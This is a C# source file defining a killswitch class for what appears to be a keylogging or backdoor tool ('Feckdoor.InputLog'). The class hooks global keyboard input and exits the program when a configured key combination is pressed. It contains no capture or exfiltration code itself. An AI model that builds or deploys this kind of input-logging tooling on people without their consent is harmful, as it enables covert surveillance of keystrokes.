using Serilog;
using System.Diagnostics;
using System.Text;

namespace Feckdoor.InputLog
{
	public class KillswitchHandler : IDisposable
	{
		private readonly IEnumerable<VkCode> KillswitchBinding;
		private bool disposed;

		public KillswitchHandler()
		{
			KeyboardHook.OnKeyboardInput += CheckKillswitch;
			KillswitchBinding = Config.TheConfig.Killswitch.Split(' ').Select(vkCodeHex =>
			{
				try
				{
					return (VkCode)int.Parse(vkCodeHex);
				}
				catch (Exception e)
				{
					return VkCode.None;
				}
			});
		}

		internal void CheckKillswitch(object? sender, KeyboardInputEventArgs args)
		{
			// Check killswitch
			if (KillswitchBinding.All(vk => (User32.GetAsyncKeyState((int)vk) & 1) != 0))
			{
				Log.Information("Killswitch triggered. The program will exit.");
				Program.Shutdown();
			}
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposed)
			{
				if (disposing)
					KeyboardHook.OnKeyboardInput -= CheckKillswitch;

				disposed = true;
			}
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}
}
